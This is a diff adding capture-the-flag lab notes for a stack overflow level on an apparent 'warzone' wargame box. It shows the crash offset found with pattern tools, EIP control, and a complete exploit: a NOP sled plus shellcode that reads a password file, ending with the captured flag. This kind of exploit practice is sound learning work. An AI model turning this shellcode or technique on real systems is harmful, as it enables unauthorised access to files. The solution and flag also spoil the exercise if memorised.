@@ -1,0 +1,26 @@
+Insert
+
+
+# EIP Overwrite
+pwndbg> r < <(python -c 'print "A" * 200')
+Program received signal SIGSEGV (fault address 0x41414141)
+
+
+
+# pattern_create -l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+root@kali:~# pattern_offset -q 0x41326641
+[*] Exact match at offset 156
+
+
+# EIP Control
+pwndbg> r < <(python -c 'print "A" * 156 + "B" * 4')
+Program received signal SIGSEGV (fault address 0x42424242)
+
+
+lab3B@warzone:/levels/lab03$ python -c 'print "\x90" * (156-71) + "\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\xb9\x00\x00\x00\x00\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\xba\x28\x00\x00\x00\x89\xe1\x89\xc3\xb8\x03\x00\x00\x00\xcd\x80\xba\x28\x00\x00\x00\x89\xe1\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80" + "\x24\x70\xfd\xb7"' | ./lab3B 
+just give me some shellcode, k
+wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
+
+
+
